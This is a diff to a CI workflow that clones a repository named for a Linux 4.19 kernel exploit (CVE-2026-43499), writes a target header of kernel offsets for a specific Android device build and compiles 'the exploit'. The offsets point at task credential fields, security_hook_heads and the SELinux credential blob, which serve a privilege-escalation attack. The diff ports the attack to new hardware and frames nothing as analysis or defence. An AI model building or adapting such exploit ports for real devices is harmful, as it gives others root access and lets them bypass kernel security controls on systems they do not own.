@@ -1,4 +1,4 @@
-name: build_k40_port_for_m36
+name: build_k40_port_for_m36_v2
 on: [push, workflow_dispatch]
 
 jobs:
@@ -17,11 +17,15 @@ jobs:
           git clone https://github.com/yijiacloud/ghostlock-cve-2026-43499-4.19-k40.git
           cd ghostlock-cve-2026-43499-4.19-k40
 
-      - name: Patch target.h for M36 (MT6762V)
+      - name: Patch target.h for M36
         run: |
           cd ghostlock-cve-2026-43499-4.19-k40
           
-          cat << 'EOF' > src/targets/oplus-4.19.157-perf/target.h
+          # Create the directory the Makefile expects
+          mkdir -p src/targets/blazer-CP2A.260605.012
+          
+          # Write our target.h into that specific directory
+          cat << 'EOF' > src/targets/blazer-CP2A.260605.012/target.h
           #pragma once
           #include <stdint.h>
 
@@ -34,31 +38,29 @@ jobs:
           #define SECURITY_HOOK_HEADS_OFF 0x14c8288UL   // security_hook_heads (ffffff8009548288)
           #define KMALLOC_CACHES_OFF      0x14c7df0UL   // kmalloc_caches (ffffff8009547df0)
           
-          // From our disassembly (commit_creds)
-          #define TASK_REAL_CRED_OFF      1880          // 0x758
-          #define TASK_CRED_OFF           1888          // 0x760
-          #define TASK_COMM_OFF           1896          // 0x768
+          #define TASK_REAL_CRED_OFF      1880
+          #define TASK_CRED_OFF           1888
+          #define TASK_COMM_OFF           1896
           
-          // Standard 4.19 arm64 offsets
           #define CRED_CAPS_OFF           40
           #define CRED_SECURITY_OFF       120
           #define SELINUX_CRED_BLOB_OFF   0
           
-          // Pipe & other structs (standard for 4.19)
           #define PIPE_INODE_INFO_OFF     0
           #define PIPE_BUFFER_OFF         0
           #define CONFIGFS_BUFFER_OFF     0
           #define ASHMEM_MISC_OFF         0
-          #define EMPTY_ZERO_PAGE_OFF     0x190e000UL // empty_zero_page (ffffff80098fe000)
+          #define EMPTY_ZERO_PAGE_OFF     0x190e000UL
           EOF
 
-          echo "=== New target.h created ==="
-          cat src/targets/oplus-4.19.157-perf/target.h
+          echo "=== target.h created in blazer dir ==="
+          ls -la src/targets/blazer-CP2A.260605.012/
 
       - name: Build the exploit
         run: |
           cd ghostlock-cve-2026-43499-4.19-k40
-          make
+          # Run make with PROJECT set to the blazer directory
+          make PROJECT=blazer-CP2A.260605.012
           
           echo "=== Built files ==="
           find . -name "*.so" -o -name "exploit" -o -name "preload*" | head -n 20
